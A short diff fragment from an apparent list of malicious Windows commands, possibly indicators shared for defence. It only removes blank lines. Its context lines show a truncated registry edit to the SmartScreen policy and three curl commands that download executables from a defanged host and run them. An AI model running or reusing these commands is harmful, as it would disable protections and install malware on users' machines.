@@ -316,5 +316,3 @@ cmd /c reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\System /v EnableSmartScr
 cmd /c %windir%\system32\curl.exe http://l96[.]org/n.exe -o %windir%\n.exe & %windir%\n.exe 
 cmd /c %windir%\system32\curl.exe http://l96[.]org/r.exe -o %windir%\r.exe & %windir%\r.exe 
 cmd /c %windir%\system32\curl.exe http://l96[.]org/c.exe -o %windir%\c.exe & %windir%\c.exe 
-
-
